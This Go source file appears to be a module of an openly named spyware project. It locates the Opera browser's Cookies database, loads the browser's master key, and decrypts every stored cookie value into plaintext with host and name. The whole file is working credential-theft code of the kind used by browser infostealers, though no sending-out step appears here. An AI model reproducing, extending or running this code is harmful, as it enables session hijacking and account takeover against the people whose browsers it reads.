package opera

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"

	"github.com/Nevesto/spyware/models"
	_ "modernc.org/sqlite"
)

func FindCookieFile() (string, error) {
	operaUserDataPath, err := GetOperaUserDataPath()
	if err != nil {
		return "", fmt.Errorf("failed to get Opera user data path: %w", err)
	}

	cookieFile := filepath.Join(operaUserDataPath, "Cookies")
	if _, err := os.Stat(cookieFile); err == nil {
		return cookieFile, nil
	}

	return "", fmt.Errorf("Opera Cookies file not found")
}



func ReadCookies(cookieFile string) ([]models.Cookie, error) {
	masterKeyPath, err := GetMasterKeyPath()
	if err != nil {
		return nil, fmt.Errorf("failed to get master key path: %w", err)
	}
	masterKey, err := getMasterKey(masterKeyPath)
	if err != nil {
		return nil, fmt.Errorf("failed to get master key: %w", err)
	}
	db, err := sql.Open("sqlite", cookieFile)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cookies []models.Cookie
	for rows.Next() {
		var cookie models.Cookie
		var encryptedValue []byte
		if err := rows.Scan(&cookie.HostKey, &cookie.Name, &encryptedValue); err != nil {
			return nil, err
		}
		decryptedValue, err := DecryptPassword(encryptedValue, masterKey)
		if err != nil {
			decryptedValue = fmt.Sprintf("DECRYPTION_FAILED_%v", err)
		}
		cookie.Value = decryptedValue
		cookies = append(cookies, cookie)
	}

	return cookies, nil
}
